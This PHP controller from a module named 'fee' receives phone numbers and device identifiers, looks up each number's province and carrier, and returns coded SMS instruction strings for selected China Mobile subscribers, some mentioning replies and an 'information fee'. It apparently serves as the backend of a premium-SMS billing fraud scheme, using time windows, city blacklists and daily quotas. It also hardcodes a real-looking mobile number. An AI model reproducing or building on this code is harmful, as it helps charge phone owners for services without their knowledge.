<?php
namespace app\fee\controller;

use think\Cache;
use think\Controller;

class Resources extends Controller
{
    public function index()
    {
        return "123555";
    }

    /**
     * 服务器转接数据
     * 如果返回123则为由服务器返回
     * 如果返回其他则由当前服务器返回
     * @return string
     */
    public function update2(){
        // 获取参数
        $data = input("get.");

        // 当前时间(只允许0~7时操作)
        $now = date("H");
        if ($now >= 7) {

            // 格式化数据
            $DataProcessing = Model('DataProcessing', 'logic');
            $phone = $DataProcessing->formatPhoneNumber($data['flag1']);

            // 查找归属地
            $res = Model("Hdcx")->checkProvinceByPhone($phone);
            if ($res) {
//                if ($res->province == "新疆" && $res->isp == '移动') {
//                    Model("Success")->insert(["phone" => $phone, "type" => 1, "uid" => $data['uid']]);
//                    return "1KW1002DH?1?ehwwhwdh?XLA?6?" . $data['uid'] . "?60?0?0";
//                }
//                if ($res->province == "辽宁" && $res->isp == '移动') {
//                    Model("Success")->insert(["phone" => $phone, "type" => 2, "uid" => $data['uid']]);
//                    return "1KW1002DH?1?ehwlwiws?9?4?" . $data['uid'] . "?60?0?0";
//                }
                if ($res->province == "海南" && $res->isp == '移动') {
                    Model("Success")->insert(["phone" => $phone, "project_id" => 99, "uid" => $data['uid']]);
                    return "1KW1002DH?1?ehwwhwdh?XL9?3?" . $data['uid'] . "?60?0?0";
                }
//                if ($res->province == "广东" && !in_array($res->city,['广州','河源']) && $res->isp == '移动'){
//                    Model("Success")->insert(["phone" => $phone, "type" => 4, "uid" => $data['uid']]);
//                    // return "1KW1002DH?1?ehwwhsel?DZ14?2?1?360?0?<>1KW1003DH?回复“?”或?信息费?中国移动?";
//                    return "1KW1002DH?1?ehwwhsel?DZ14?1?" . $data['uid'] . "?360?0?<>1KW1003DH?回复“?”或?信息费?中国移动?";
//                }
            }
        }
        return "123";
    }

    /**
     * 服务器转接数据
     * 如果返回123则为由服务器返回
     * 如果返回其他则由当前服务器返回
     * @return string
     */
    public function update(){

        // 数据统计
        $StatisticsLogic = Model("Statistics","Logic");
        $StatisticsLogic->run();

        // 明天时间
        $tomorrow = strtotime(date("Y-m-d", strtotime("+1 day")));

        // 获取参数
        $data = input("get.");

        // 当前时间(不允许0~7时操作)
        $now = date("H");
        if ($now >= 7) {

            // 格式化数据
            $DataProcessing = Model('DataProcessing', 'logic');
            $phone = $DataProcessing->formatPhoneNumber($data['flag1']);

            // 查找归属地
            $res = Model("Hdcx")->checkProvinceByPhone($phone);
            if ($res) {

                /** 手动任务 **/
//                if ($res->province == "海南" && $res->isp == '移动') {
//                    Model("Success")->insert(["phone" => $phone, "project_id" => 99, "uid" => $data['uid']]);
//                    return "1KW1002DH?1?ehwwhwdh?XL9?3?" . $data['uid'] . "?60?0?0";
//                }

                /** 系统任务 **/

                // 转换拼音
                $PinyinLogic = Model('Pinyin', 'logic');
                $provincePinyin = $PinyinLogic->encode($res->province,'all');

                // 获取缓存
                $redis = Cache::store('redis')->handler();
                $projectList = $redis->hgetall("projet:" . $provincePinyin);
                if ($projectList) {
                    foreach ($projectList as $key=>$v) {
                        $id = $key;
                        $item = json_decode($v);

                        if ($item->isstart == 1) { // 开关

                            // 时间控件
                            $start_time = $item->start_time;
                            $end_time = $item->end_time;
                            $nowHiTime = (date("H:i"));
                            if ($start_time == null || $end_time == null) {  // 时间为空
                                continue;
                            } elseif ($nowHiTime < $start_time || $nowHiTime > $end_time) { // 不在有效时间
                                continue;
                            }

                            // 黑名单
                            $blacklist_city = explode(",", $item->blacklist_city);
                            if (in_array($res->city, $blacklist_city)) {
                                continue;
                            }

                            // 获取限制数量(0为一直执行)
                            $total = $redis->hget("total_daily:" . $id, date("Ymd"));
                            if ($total < $item->total_daily || $item->total_daily == 0) {

                                // 短信模板
                                $sms = str_replace("uid", $data['uid'], $item->sms);

                                // 去除重复日志
                                $getKey = "log:" . $id . ":" . date("Ymd");
                                $getData = md5(json_encode($data)); // 如果重复参数则不作记录
                                $getRedis = $redis->hsetnx($getKey,$getData,date("Y-m-d H:i:s"));

                                // 如果生成成功才记录日志则不返回
                                if($getRedis){

                                    $redis->expire($getKey, $tomorrow - time());

                                    // 记录日志
                                    Model("Success")->insert([
                                        "phone" => $phone,
                                        "project_id" => $item->project_id,
                                        "uid" => $data['uid'],
                                        "flag2" => $data['flag2'],
                                        "channel" => $data['channel'],
                                        "version" => $data['version'],
                                        "province" => $res->province,
                                        "city" => $res->city,
                                        "sms" => $sms,
                                        "ctime" => date("Y-m-d H:i:s")
                                    ]);

                                    // 计数器加一
                                    $redis->hincrby("total_daily:" . $id, date("Ymd"), 1);

                                    // 输出总数
                                    $StatisticsLogic->total_output_today();

                                }

                                return $sms;
                            }

                        }
                    }
                }
            }
        }

        return "123";
    }

    /**
     * 服务器转接数据
     * 如果返回123则为由服务器返回
     * 如果返回其他则由当前服务器返回
     * @return string
     */
    public function test(){

        // 格式化数据
        $DataProcessing = Model('DataProcessing','logic');
        $phone = 'ehwwhwdh';
        $phone = $DataProcessing->decodePhone($phone);

        dump($phone);

        // 格式化数据
        $DataProcessing = Model('DataProcessing','logic');
        $phone = '15919829113';
        $phone = $DataProcessing->encodePhone($phone);

        dump($phone);


        $phone = 'eorhhdeashh';
        $phone = $DataProcessing->formatPhoneNumber($phone);

        // 查找归属地
        $res = Model("Hdcx")->checkProvinceByPhone($phone);
        dump($res);

//        // 获取参数
//        $data = input("get.");
//
//        // 当前时间(只允许0~7时操作)
//        $now = date("H");
//        if($now>=7){
//
//            // 格式化数据
//            $DataProcessing = Model('DataProcessing','logic');
//            $phone = $DataProcessing->formatPhoneNumber($data['flag1']);
//
//            // 查找归属地
//            $res = Model("Hdcx")->checkProvinceByPhone($phone);
//            if($res){
//                if ($res->province == "新疆" && $res->isp == '移动') {
//                    Model("Success")->insert(["phone"=>$phone]);
//                    return "1KW1002DH?1?ehwwhwdh?XLA?6?00000001?60?0?";
//                }
//            }
//        }
//        return "123";
    }

    public function check(){
        for($i=1;$i<200;$i++){
            $res = Model("Url")->where("content is null")->find();

            dump($res->url);
            $a = $this->post_json_data($res->url,json_encode([]));
            dump($a);
            Model("Url")->where("id",$res['id'])->update(["content"=>utf8_encode($a['result'])]);

        }
    }

    /*
     * post 发送JSON 格式数据
     * @param $url string URL
     * @param $data_string string 请求的具体内容
     * @return array
     *      code 状态码
     *      result 返回结果
     */
    function post_json_data($url, $data_string) {
        //初始化
        $ch = \curl_init();
        //设置post方式提交
        \curl_setopt($ch, CURLOPT_POST, 1);
        //设置抓取的url
        \curl_setopt($ch, CURLOPT_URL, $url);
        //设置post数据
        \curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
        //设置头文件的信息作为数据流输出
        \curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                'Content-Type: application/json; charset=utf-8',
                'Content-Length: ' . strlen($data_string))
        );
        \ob_start();
        //执行命令
        \curl_exec($ch);
        $return_content = \ob_get_contents();
        \ob_end_clean();
        $return_code = \curl_getinfo($ch, CURLINFO_HTTP_CODE);
        return array('code'=>$return_code, 'result'=>$return_content);
    }


}